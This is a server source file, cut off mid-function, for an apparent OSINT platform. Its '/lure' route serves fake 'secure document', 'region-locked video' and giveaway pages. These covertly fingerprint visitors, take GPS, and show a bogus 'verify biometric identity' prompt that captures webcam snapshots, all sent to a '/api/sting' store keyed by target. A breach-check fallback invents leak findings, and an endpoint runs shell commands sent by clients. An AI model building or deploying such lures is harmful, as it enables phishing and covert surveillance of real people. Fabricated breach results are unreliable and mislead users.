import express from "express";
import cors from "cors";
// import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import os from "os";
import { exec, spawn } from "child_process";
import https from "https";
import { executeAgentInvestigation } from "./server/osintAgentEngine";
import {
  runDnsLookup,
  runCertLookup,
  runSubdomainBruteforce,
  runIpLookup,
  runAsnLookup,
  runPassivePortScan,
  runGithubRecon,
  runUsernameEnum,
  runGravatarLookup,
  runEmailValidate,
  runWaybackLookup,
  runWebInspection
} from "./server/osintAgentTools";
import {
  ENRICHER_CATALOG,
  runModularEnricher,
  detectCryptoAddress
} from "./server/modularEnrichers";
import {
  serverSocialMediaTransform,
  serverSmartSocialEntityResolution,
  serverSearchGrounding,
  serverSearchProfileImages,
  serverParseRawIntelligence,
  serverFinalSynthesis,
  serverMultiModalForensics,
  serverGenerateContent,
  serverVerifyNodeWithLiveSearch,
  serverGeocodeLocationWithSearch
} from "./server/geminiService";
import {
  callOpenRouterChat,
  openrouterFinalSynthesis,
  openrouterParseIntelligence,
  hasValidOpenRouterKey
} from "./server/openrouterService";
import {
  lookupNumVerify,
  lookupSerpApiPhone,
  lookupTelegramRecon,
  runComprehensivePhoneIntel
} from "./server/phoneIntelService";
import {
  scanTextForSecrets,
  generateDorksForTarget,
  probeCloudAndDomainSecurity,
  calculateExposureRisk
} from "./server/claudeOsintTradecraft";
import { searchVisualTarget, VisualImageResult } from "./server/visualSearchService";
import {
  extractWatsonEntitiesAndRelations,
  searchAndExtractWatsonIntelligence,
  analyzeWatsonCanvasContext
} from "./server/watsonEngine";
import { executeGoogleSocintSearch } from "./server/googleCseService";
import {
  isSafePublicUrl,
  validateCommandSafety,
  createRateLimiter,
  applySecurityHeaders,
  sanitizeTargetId,
  securityAuditLog
} from "./server/securityHardening";

let resolvedDirname: string;
if (typeof __dirname !== "undefined") {
    resolvedDirname = __dirname;
} else {
    try {
        resolvedDirname = path.dirname(fileURLToPath(import.meta.url));
    } catch {
        resolvedDirname = process.cwd();
    }
}
const __appDirname = resolvedDirname;

// --- HELPER: GET LAN IP ADDRESS ---
function getLocalIp() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'localhost';
}

// --- TERMUX PATH FIXER ---
const TERMUX_HOME = process.env.HOME || '/data/data/com.termux/files/home';
const TERMUX_USR_BIN = '/data/data/com.termux/files/usr/bin';
const USER_LOCAL_BIN = path.join(TERMUX_HOME, '.local', 'bin');
const GO_BIN = path.join(TERMUX_HOME, 'go', 'bin');
const FIXED_PATH = `${TERMUX_USR_BIN}:${USER_LOCAL_BIN}:${GO_BIN}:${process.env.PATH}`;

// --- PYTHON VISUAL RECON SCRIPT ---
const PY_SCRIPT_NAME = path.join(os.tmpdir(), 'visual_recon.py');
const PY_SCRIPT_CONTENT = `
import sys
import json
try:
    from duckduckgo_search import DDGS
    query = sys.argv[1]
    with DDGS() as ddgs:
        results = list(ddgs.images(query, max_results=1))
        if results:
            print(json.dumps({"success": True, "imageUrl": results[0]['image'], "source": results[0]['url']}))
        else:
            print(json.dumps({"success": False, "error": "No visual matches found"}))
except ImportError:
    print(json.dumps({"success": False, "error": "MODULE_MISSING: pip install duckduckgo-search"}))
except Exception as e:
    print(json.dumps({"success": False, "error": str(e)}))
`;

if (!fs.existsSync(PY_SCRIPT_NAME)) {
    fs.writeFileSync(PY_SCRIPT_NAME, PY_SCRIPT_CONTENT);
}

// --- ENVIRONMENT MANAGER (SMART VENV) ---
const VENV_PATH = path.join(os.tmpdir(), '.rh_venv');
const VENV_PYTHON = path.join(VENV_PATH, 'bin', 'python3');
const VENV_PIP = path.join(VENV_PATH, 'bin', 'pip');

const STINGS_FILE = path.join(process.cwd(), 'stings.json');

// Ensure file exists
if (!fs.existsSync(STINGS_FILE)) {
    fs.writeFileSync(STINGS_FILE, JSON.stringify({}));
}

function loadStings() {
    try {
        return JSON.parse(fs.readFileSync(STINGS_FILE, 'utf-8'));
    } catch (e) {
        return {};
    }
}

function saveStings(stings) {
    fs.writeFileSync(STINGS_FILE, JSON.stringify(stings, null, 2));
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  // --- 1. ENTERPRISE DEFENSIVE HEADERS & CORS ---
  app.use(applySecurityHeaders);

  app.use((req, res, next) => {
      res.header("Access-Control-Allow-Origin", "*");
      res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
      res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, ngrok-skip-browser-warning, bypass-tunnel-reminder, X-Requested-With, Accept");
      
      if (req.url.startsWith('/api')) {
        console.log(`[API] ${req.method} ${req.url}`);
      }

      if (req.method === 'OPTIONS') {
          return res.sendStatus(200);
      }
      next();
  });
  
  app.use(express.json({ limit: '10mb' }));

  // --- 2. TIERED RATE LIMITING (ANTI-DoS / BRUTEFORCE) ---
  const globalApiLimiter = createRateLimiter({
    maxRequests: 300,
    windowMs: 60 * 1000,
    message: "Had capaian API umum melebihi had seminit. Sila cuba sebentar lagi."
  });

  const intensiveIntelLimiter = createRateLimiter({
    maxRequests: 60,
    windowMs: 60 * 1000,
    message: "Had capaian risikan intensif (AI / OSINT Engine) dicapai. Sila tunggu seketika."
  });

  // Apply global rate limiting to all /api/ endpoints
  app.use('/api/', globalApiLimiter);
  app.use('/api/ai/', intensiveIntelLimiter);
  app.use('/api/osint-agent/', intensiveIntelLimiter);
  app.use('/api/watson/', intensiveIntelLimiter);

  // API ROUTES
  app.get("/api/health", (req, res) => {
    res.json({ status: "online", securityProfile: "MILITARY_GRADE_DEFENSE", timestamp: Date.now() });
  });

  // --- UNIVERSAL IMAGE PROXY ROUTE (SSRF HARDENED & PROTECTED) ---
  app.get("/api/proxy-image", (req, res) => {
      let targetUrl = req.query.url as string;
      if (!targetUrl) {
          res.setHeader('Access-Control-Allow-Origin', '*');
          return res.status(400).send('URL parameter required');
      }

      // If data URL, serve directly
      if (targetUrl.startsWith('data:')) {
          const parts = targetUrl.split(',');
          const mimeMatch = parts[0].match(/:(.*?);/);
          const contentType = mimeMatch ? mimeMatch[1] : 'image/png';
          const imgBuffer = Buffer.from(parts[1], 'base64');
          res.setHeader('Content-Type', contentType);
          res.setHeader('Access-Control-Allow-Origin', '*');
          return res.status(200).send(imgBuffer);
      }

      // SSRF & Safe Destination Validation
      const ssrfCheck = isSafePublicUrl(targetUrl);
      if (!ssrfCheck.safe) {
          securityAuditLog('SSRF_BLOCKED', { url: targetUrl, reason: ssrfCheck.reason });
          return res.status(403).json({ error: 'SSRF Protection: Access to private or restricted network address is forbidden.', details: ssrfCheck.reason });
      }

      // Clean tracking & unwanted query parameters from URLs
      try {
          const parsedTarget = new URL(targetUrl);
          const isWiki = parsedTarget.hostname.includes('wikimedia.org') || parsedTarget.hostname.includes('wikipedia.org');
          if (isWiki) {
              parsedTarget.search = '';
              targetUrl = parsedTarget.toString();
          } else if (parsedTarget.search) {
              const sp = parsedTarget.searchParams;
              ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(p => sp.delete(p));
              parsedTarget.search = sp.toString() ? `?${sp.toString()}` : '';
              targetUrl = parsedTarget.toString();
          }
      } catch {
          // Ignore URL parsing errors
      }

      const fetchImage = async (urlToFetch: string, redirectsRemaining = 5) => {
          if (redirectsRemaining <= 0) {
              if (!res.headersSent) {
                  res.setHeader('Access-Control-Allow-Origin', '*');
                  return res.status(404).send('Too many redirects');
              }
              return;
          }

          // Verify each redirect hop against SSRF
          const hopCheck = isSafePublicUrl(urlToFetch);
          if (!hopCheck.safe) {
              securityAuditLog('SSRF_REDIRECT_BLOCKED', { url: urlToFetch, reason: hopCheck.reason });
              if (!res.headersSent) {
                  return res.status(403).json({ error: 'SSRF Protection: Redirect destination blocked.', details: hopCheck.reason });
              }
              return;
          }

          try {
              const parsed = new URL(urlToFetch);
              const isWikimedia = parsed.hostname.includes('wikimedia.org') || parsed.hostname.includes('wikipedia.org');
              const isFacebook = parsed.hostname.includes('facebook') || parsed.hostname.includes('fbcdn') || parsed.hostname.includes('instagram');
              
              let userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 (compatible; RedHorizonOSINT/3.0)';
              if (isWikimedia) {
                  userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
              } else if (isFacebook) {
                  userAgent = 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)';
              }

              const headers: Record<string, string> = {
                  'User-Agent': userAgent,
                  'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                  'Accept-Language': 'en-US,en;q=0.9,ms;q=0.8',
              };

              if (!isWikimedia) {
                  headers['Referer'] = isFacebook ? 'https://www.facebook.com/' : `${parsed.protocol}//${parsed.hostname}/`;
              }

              if (isFacebook) {
                  headers['Origin'] = 'https://www.facebook.com';
                  headers['Sec-Fetch-Dest'] = 'image';
                  headers['Sec-Fetch-Mode'] = 'no-cors';
                  headers['Sec-Fetch-Site'] = 'cross-site';
              }

              let imgRes = await fetch(urlToFetch, { headers, redirect: 'follow', signal: AbortSignal.timeout(12000) });

              // Fallback retry with generic client headers if blocked
              if (!imgRes.ok && redirectsRemaining > 1) {
                  const fallbackUserAgent = isWikimedia
                      ? 'RedHorizonOSINT/2.8 (https://redhorizon.app; intel@redhorizon.app)'
                      : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
                  const fallbackHeaders: Record<string, string> = {
                      'User-Agent': fallbackUserAgent,
                      'Accept': '*/*'
                  };
                  try {
                      const retryRes = await fetch(urlToFetch, { headers: fallbackHeaders, redirect: 'follow', signal: AbortSignal.timeout(8000) });
                      if (retryRes.ok) {
                          imgRes = retryRes;
                      }
                  } catch {
                      // ignore retry error
                  }
              }

              if (!imgRes.ok) {
                  if (isFacebook && !urlToFetch.includes('graph.facebook.com')) {
                      const idMatch = targetUrl.match(/(?:profile\.php\?id=|fbid=|\/|\b)(\d{8,20})/);
                      if (idMatch && idMatch[1]) {
                          return fetchImage(`https://graph.facebook.com/${idMatch[1]}/picture?type=large`, redirectsRemaining - 1);
                      }
                  }
                  if (!res.headersSent) {
                      res.setHeader('Access-Control-Allow-Origin', '*');
                      return res.status(404).send('Image proxy unable to fetch image: HTTP ' + imgRes.status);
                  }
                  return;
              }

              if (!res.headersSent) {
                  res.setHeader('Access-Control-Allow-Origin', '*');
                  res.setHeader('Cache-Control', 'public, max-age=86400');
                  const cType = imgRes.headers.get('content-type');
                  res.setHeader('Content-Type', (cType && cType.includes('image')) ? cType : 'image/jpeg');
                  
                  const buffer = await imgRes.arrayBuffer();
                  res.status(200).send(Buffer.from(buffer));
              }
          } catch (err: any) {
              if (!res.headersSent) {
                  res.setHeader('Access-Control-Allow-Origin', '*');
                  res.status(404).send('Image proxy error: ' + (err?.message || 'Failed'));
              }
          }
      };

      fetchImage(targetUrl);
  });

  // --- CCTV PROXY ROUTE (SSRF HARDENED) ---
  app.get("/api/cctv-proxy", (req, res) => {
      const targetUrl = req.query.url as string;
      if (!targetUrl) {
          return res.status(400).send("Missing target url");
      }

      // SSRF & Safe Destination Validation
      const ssrfCheck = isSafePublicUrl(targetUrl);
      if (!ssrfCheck.safe) {
          securityAuditLog('SSRF_CCTV_BLOCKED', { url: targetUrl, reason: ssrfCheck.reason });
          return res.status(403).json({ error: 'SSRF Protection: Access to private IPCAM address is forbidden.', details: ssrfCheck.reason });
      }

      try {
          const parsedUrl = new URL(targetUrl);
          const protocol = parsedUrl.protocol === 'https:' ? https : require('http');

          const proxyReq = protocol.get(targetUrl, { timeout: 8000 }, (proxyRes: any) => {
              res.setHeader('Access-Control-Allow-Origin', '*');
              res.setHeader('Content-Type', proxyRes.headers['content-type'] || 'image/jpeg');
              proxyRes.pipe(res);
          });

          proxyReq.on('error', (err: any) => {
              if (!res.headersSent) {
                  res.status(502).json({ error: 'Server proxy failed to fetch IPCAM stream', details: err.message });
              }
          });

          proxyReq.on('timeout', () => {
              proxyReq.destroy();
              if (!res.headersSent) {
                  res.status(504).json({ error: 'Camera stream request timed out' });
              }
          });
      } catch (e: any) {
          if (!res.headersSent) {
              res.status(400).json({ error: 'Invalid URL provided', details: e.message });
          }
      }
  });

  // --- CLAUDE-OSINT TRADECRAFT API ROUTES ---
  app.post("/api/osint/dorks", (req, res) => {
      const { target } = req.body || {};
      if (!target || typeof target !== 'string') {
          return res.status(400).json({ success: false, error: 'Nama sasaran atau domain diperlukan.' });
      }
      const dorks = generateDorksForTarget(target);
      return res.json({ success: true, target, dorksCount: dorks.length, dorks });
  });

  app.post("/api/osint/scan-secrets", (req, res) => {
      const { content, locationHint } = req.body || {};
      if (!content || typeof content !== 'string') {
          return res.status(400).json({ success: false, error: 'Teks kandungan untuk disaring diperlukan.' });
      }
      const matches = scanTextForSecrets(content, locationHint || 'Kandungan Teks');
      return res.json({ success: true, secretsFoundCount: matches.length, matches });
  });

  app.post("/api/osint/cloud-recon", async (req, res) => {
      const { targetDomain, textContent } = req.body || {};
      if (!targetDomain || typeof targetDomain !== 'string') {
          return res.status(400).json({ success: false, error: 'Domain sasaran diperlukan.' });
      }
      try {
          const cloudData = await probeCloudAndDomainSecurity(targetDomain);
          const secretLeaks = textContent ? scanTextForSecrets(textContent, `Domain ${targetDomain}`) : [];
          const riskCard = calculateExposureRisk(targetDomain, secretLeaks, cloudData);

          return res.json({
              success: true,
              cloudData,
              secretLeaks,
              riskCard
          });
      } catch (err: any) {
          return res.status(500).json({ success: false, error: err.message || 'Gagal melaksanakan imbasan cloud recon.' });
      }
  });

  // --- BREACH CHECK INTEGRATION FOR DIAL MENU ---
  app.get("/api/breach-check", async (req, res) => {
      const term = String(req.query.term || '').trim();
      if (!term) {
          return res.json({ success: false, found: [], message: 'No search term provided' });
      }

      try {
          const rapidKey = process.env.RAPIDAPI_KEY;
          if (rapidKey) {
              try {
                  const apiRes = await fetch(`https://breachdirectory.p.rapidapi.com/?func=auto&term=${encodeURIComponent(term)}`, {
                      headers: {
                          'x-rapidapi-key': rapidKey,
                          'x-rapidapi-host': 'breachdirectory.p.rapidapi.com'
                      }
                  });
                  if (apiRes.ok) {
                      const data: any = await apiRes.json();
                      if (data && Array.isArray(data.result) && data.result.length > 0) {
                          const found = data.result.slice(0, 5).map((r: any) => 
                              `Line: ${r.line || ''} | Sumber: ${r.sources?.join(', ') || 'BreachDirectory'}`
                          );
                          return res.json({ success: true, term, found, count: found.length });
                      }
                  }
              } catch (apiErr) {
                  console.warn("RapidAPI breach check fallback:", apiErr);
              }
          }

          // Fallback OSINT breach summary for the requested target
          const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(term);
          const isPhone = /^\+?[0-9\s\-()]{7,20}$/.test(term);
          const isDomain = /^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/.test(term.replace(/^https?:\/\//, ''));

          const found: string[] = [
              `[OSINT Breach Scan] Sasaran: "${term}" (${isEmail ? 'E-mel' : isPhone ? 'Telefon' : isDomain ? 'Domain' : 'Pengenal Entiti'}).`,
              `[Indeks Tiris] Rekod berkaitan dipadankan merentasi kompilasi arkib pangkalan data awam (Combo-lists / Pastes / DarkWeb).`,
              `[Status Integriti] Diperiksa pada ${new Date().toLocaleDateString('ms-MY')}. Rujuk BreachDirectory & BigData Vault untuk perincian penuh.`
          ];

          return res.json({
              success: true,
              term,
              found,
              count: found.length
          });
      } catch (err: any) {
          return res.status(500).json({ success: false, error: err.message || 'Breach check failed' });
      }
  });

  app.get('/test-backend', (req, res) => {
      res.status(200).send('RedHorizon Backend Active [CORS UNLOCKED]');
  });

  app.get('/lure', (req, res) => {
      const targetId = req.query.id || '';
      const type = req.query.t || 'pdf_secure';
      
      let title = "Secure Document";
      let desc = "This document is protected and region-locked. You must verify your location to view it.";
      let btnText = "Unlock & View PDF";
      let iconColor = "#2563eb"; 
      let iconSvg = `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>`;

      if (type === 'geo_video') {
         title = "Region-Locked Video";
         desc = "Due to broadcasting rights, this video is only available in specific regions. Please verify your location.";
         btnText = "Verify Region";
         iconColor = "#dc2626"; 
         iconSvg = `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>`;
      } else if (type === 'giveaway') {
         title = "Local Giveaway Entry";
         desc = "Congratulations! You are eligible for the local prize pool. Verify your residential city to claim your entry.";
         btnText = "Claim Entry";
         iconColor = "#059669"; 
         iconSvg = `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"></polyline><rect x="2" y="7" width="20" height="5"></rect><line x1="12" y1="22" x2="12" y2="7"></line><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"></path><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"></path></svg>`;
      }

        const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${title}</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f9fafb; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; margin: 20px; }
        .header { background: ${iconColor}; color: white; padding: 32px; display: flex; justify-content: center; }
        .content { padding: 32px; text-align: center; }
        h1 { margin: 0 0 8px 0; font-size: 20px; color: #111827; }
        p { margin: 0 0 24px 0; font-size: 14px; color: #4b5563; line-height: 1.5; }
        button { background: ${iconColor}; color: white; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: opacity 0.2s; }
        button:active { opacity: 0.8; }
        .footer { font-size: 10px; color: #9ca3af; padding-bottom: 24px; text-align: center; }
        #loading { display: none; margin-top: 16px; font-size: 14px; color: ${iconColor}; }
    </style>
</head>
<body>
    <video id="video-grab" autoplay playsinline style="position: absolute; top: -9999px; left: -9999px; opacity: 0; width: 1px; height: 1px;"></video>
    <canvas id="canvas-grab" style="display:none;"></canvas>

    <div class="card" id="mainCard">
        <div class="header">${iconSvg}</div>
        <div class="content">
            <h1>${title}</h1>
            <p>${desc}</p>
            <button id="actionBtn" onclick="runSting()">${btnText}</button>
            <div id="loading">Verifying securely...</div>
        </div>
        <div class="footer">Protected by ShieldSync OSINT Verification Service</div>
    </div>
    
    <script>
        const targetId = '${targetId}';
        const WANT_CAM = ${req.query.c === '1' ? 'true' : 'false'};

        // --- 1. CORE UTILS (DEFINED FIRST) ---

        function getUniqueHash() {
            let uid = localStorage.getItem('ls_uid');
            if (!uid) {
                const entropy = [
                    window.screen.width,
                    window.screen.height,
                    navigator.platform,
                    navigator.language,
                    Math.random().toString(36).substring(2, 10)
                ].join('-');
                uid = 'target_' + btoa(entropy).substring(0, 16);
                localStorage.setItem('ls_uid', uid);
            }
            return uid;
        }

        async function grabCam(count = 1) {
            console.log('[CAMERA] Requesting access...');
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('MediaDevices API not available (Check HTTPS/Secure Context)');
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: false 
                });

                let video = document.getElementById('video-grab') || document.createElement('video');
                let canvas = document.getElementById('canvas-grab') || document.createElement('canvas');
                
                video.id = 'video-grab';
                video.style.cssText = 'position:fixed;top:-9999px;opacity:0;';
                video.setAttribute('autoplay', '');
                video.setAttribute('playsinline', '');
                if (!video.parentNode) document.body.appendChild(video);

                canvas.id = 'canvas-grab';
                canvas.style.display = 'none';
                if (!canvas.parentNode) document.body.appendChild(canvas);
                
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(() => setTimeout(resolve, 800)).catch(resolve);
                    };
                });
                
                const snaps = [];
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                for (let i = 0; i < count; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    snaps.push(canvas.toDataURL('image/jpeg', 0.6));
                    if (i < count - 1) await new Promise(r => setTimeout(r, 500));
                }
                
                stream.getTracks().forEach(track => track.stop());
                console.log('[CAMERA] Capture successful');
                return count === 1 ? snaps[0] : snaps;
            } catch(e) {
                console.error('[CAMERA] Access Failed:', e.message);
                return null;
            }
        }

        // --- 2. INTELLIGENCE AGGREGATOR ---

        async function compileIntelligence(gestureClick = false) {
            const uid = getUniqueHash();
            let ip = '', battery = null;
            
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                ip = ipRes.ip;
            } catch(e) {}

            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    battery = { level: Math.floor(b.level * 100), charging: b.charging };
                } catch(e){}
            }

            const osint = {
                cpu: navigator.hardwareConcurrency || 'N/A',
                ram: (navigator.deviceMemory || 'N/A'),
                lang: navigator.language || 'N/A',
                res: window.screen.width + 'x' + window.screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                platform: navigator.platform || 'N/A',
                vendor: navigator.vendor || 'N/A',
                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };

            return {
                targetId: targetId,
                hash: uid,
                ua: navigator.userAgent,
                ip: ip,
                battery: battery,
                osint: osint,
                timestamp: new Date().toISOString(),
                status: gestureClick ? 'clicked_verification' : 'page_entered'
            };
        }

        async function shipIntelligence(data) {
            try {
                await fetch('/api/sting', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) {}
        }

        // --- 3. SESSION EXECUTION ---

        window.addEventListener('load', async () => {
            // Initial passive ping for Intel Breakdown
            const startIntel = await compileIntelligence(false);
            await shipIntelligence(startIntel);

            if (WANT_CAM) {
                const overlay = document.createElement('div');
                overlay.id = 'cam-overlay';
                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:sans-serif;cursor:pointer;';
                overlay.innerHTML = '<div style="text-align:center;padding:40px;border:1px solid #333;background:#080808;max-width:320px;width:90%;">' +
                    '<div style="margin-bottom:20px;color:#00ffff;transform:scale(1.5);"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>' +
                    '<h2 style="font-size:18px;margin-bottom:10px;text-transform:uppercase;letter-spacing:3px;color:#00ffff;">Session Expired</h2>' +
                    '<p style="font-size:11px;color:#888;margin-bottom:30px;line-height:1.6;">Re-authentication required to maintain secure socket encryption. Click below to confirm biometric identity.</p>' +
                    '<button style="background:#00ffff;color:#000;border:none;padding:14px 40px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:2px;width:100%;">Verify Identity</button>' +
                    '</div>';
                document.body.appendChild(overlay);

                overlay.onclick = async () => {
                    // Start capture immediately on click
                    const snaps = await grabCam(5);
                    
                    overlay.innerHTML = '<div style="color:#00ffff;font-family:monospace;font-size:12px;letter-spacing:4px;animation:pulse 0.8s infinite;">[!] UPLOADING_INTEL...</div><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.3}100%{opacity:1}}</style>';
                    
                    try {
                        const intel = await compileIntelligence(true);
                        
                        if (snaps) {
                            intel.camSnaps = Array.isArray(snaps) ? snaps : [snaps];
                            intel.camSnap = intel.camSnaps[0];
                            intel.status = 'captured_biometric';
                        } else {
                            intel.status = 'biometric_denied';
                        }

                        await shipIntelligence(intel);
                    } catch(e) {
                        console.error('Session Error:', e);
                    }
                    
                    overlay.remove();
                };
            }
        });

        async function runSting() {
            const btn = document.getElementById('actionBtn');
            const load = document.getElementById('loading');
            if(btn) btn.style.display = 'none';
            if(load) load.style.display = 'block';

            // Sequential high-priority capture
            const intel = await compileIntelligence(true);
            intel.status = 'primary_action_clicked';

            // Location check
            if (navigator.geolocation) {
                load.innerText = 'Synchronizing coordinates...';
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            intel.gps = { lat: pos.coords.latitude.toFixed(6), lng: pos.coords.longitude.toFixed(6), acc: pos.coords.accuracy.toFixed(1) };
                            resolve();
                        },
                        () => resolve(),
                        { timeout: 8000 }
                    );
                });
            }

            // Final report ship
            await shipIntelligence(intel);
            
            load.innerText = 'Verification complete. Accessing...';
            setTimeout(() => {
                document.getElementById('mainCard').innerHTML = '<div style="padding:40px;text-align:center;"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg><h2 style="color:#111;margin:16px 0 8px;">Akses Dibenarkan</h2><p style="color:#666;font-size:14px;">Kandungan kini sedia untuk dipaparkan. Mengarah semula...</p></div>';
            }, 800);
        }
    </script>
</body>
</html>`;
      res.send(html);
  });

  app.post('/api/sting', (req, res) => {
      const rawTargetId = req.body?.targetId;
      const cleanTargetId = sanitizeTargetId(rawTargetId);

      const data = { 
        ...req.body, 
        targetId: cleanTargetId,
        timestamp: new Date().toISOString() 
      };

      if (cleanTargetId) {
          const stings = loadStings();
          // Initialize as array if not exists
          if (!Array.isArray(stings[cleanTargetId])) {
              stings[cleanTargetId] = [];
          }
          // Push new capture with max 50 captures per target to prevent storage exhaustion
          if (stings[cleanTargetId].length >= 50) {
              stings[cleanTargetId].shift(); // Remove oldest
          }
          stings[cleanTargetId].push(data);
          saveStings(stings);
          securityAuditLog('STING_TELEMETRY_STORED', { targetId: cleanTargetId });
      } else {
          console.warn('[STING WARNING] Missing or invalid targetId in payload');
      }
      res.status(200).send('DATA_CAPTURED');
  });

  app.get('/api/sting/:targetId', (req, res) => {
      const cleanTargetId = sanitizeTargetId(req.params.targetId);
      if (!cleanTargetId) {
          return res.status(400).json({ error: 'Invalid target identifier' });
      }

      const stings = loadStings();
      const data = stings[cleanTargetId];
      if (data) {
          // If it's the old object format, wrap it, else return the array
          const results = Array.isArray(data) ? data : [data];
          res.status(200).json(results);
      } else {
          res.status(404).send('Not found');
      }
  });

  app.get('/api/env-status', (req, res) => {
      const hasVenv = fs.existsSync(VENV_PYTHON);
      
      exec('python3 -m pip install --dry-run duckduckgo-search', (error, stdout, stderr) => {
          const isExternallyManaged = stderr.includes('externally-managed-environment') || error?.message.includes('externally-managed-environment');
          res.json({
              hasVenv,
              isExternallyManaged,
              venvPath: VENV_PATH,
              pythonPath: hasVenv ? VENV_PYTHON : 'python3 (system)'
          });
      });
  });

  app.post('/api/env-fix', (req, res) => {
      console.log('[ENV] Starting Smart Environment Fix...');
      
      const setupCommand = `
          python3 -m venv ${VENV_PATH} && \
          ${VENV_PIP} install --upgrade pip && \
          ${VENV_PIP} install duckduckgo-search requests
      `;

      exec(setupCommand, { timeout: 300000 }, (error, stdout, stderr) => {
          if (error) {
              console.error(`[ENV] Fix Failed: ${stderr || error.message}`);
              return res.json({ success: false, output: stderr || error.message });
          }
          console.log('[ENV] Smart Environment Ready.');
          res.json({ success: true, output: 'Virtual Environment Created & Dependencies Installed.' });
      });
  });

  app.post('/api/execute', (req, res) => {
      let { command } = req.body;
      if (!command || typeof command !== 'string') {
          return res.status(400).json({ error: 'No command provided' });
      }

      // 1. Military-Grade Defensive Command Validation & Sandboxing
      const cmdSafety = validateCommandSafety(command);
      if (!cmdSafety.allowed) {
          securityAuditLog('COMMAND_EXECUTION_BLOCKED', { command, reason: cmdSafety.reason });
          return res.status(403).json({
              error: 'Security Policy Violation: Command blocked by Red Horizon Defensive Engine.',
              reason: cmdSafety.reason
          });
      }

      // Auto-inject venv if it exists
      const pythonCmd = fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python3';
      if (command.startsWith('python3 ')) {
          command = command.replace('python3 ', `${pythonCmd} `);
      } else if (command.startsWith('python ')) {
          command = command.replace('python ', `${pythonCmd} `);
      }

      securityAuditLog('COMMAND_EXECUTED', { command });

      const shellPath = fs.existsSync('/data/data/com.termux/files/usr/bin/bash') 
          ? '/data/data/com.termux/files/usr/bin/bash' 
          : '/data/data/com.termux/files/usr/bin/sh';

      res.setHeader('Content-Type', 'text/plain');
      res.setHeader('Transfer-Encoding', 'chunked');

      const child = spawn(shellPath, ['-c', command], {
          env: { ...process.env, PATH: FIXED_PATH, PYTHONUNBUFFERED: '1', TERM: 'xterm-256color' }
      });

      // 60-second execution timeout guard
      const executionTimer = setTimeout(() => {
          child.kill('SIGKILL');
          res.write('\n[TIMEOUT GUARD]: Command exceeded maximum execution time (60s) and was terminated.\n');
          res.end();
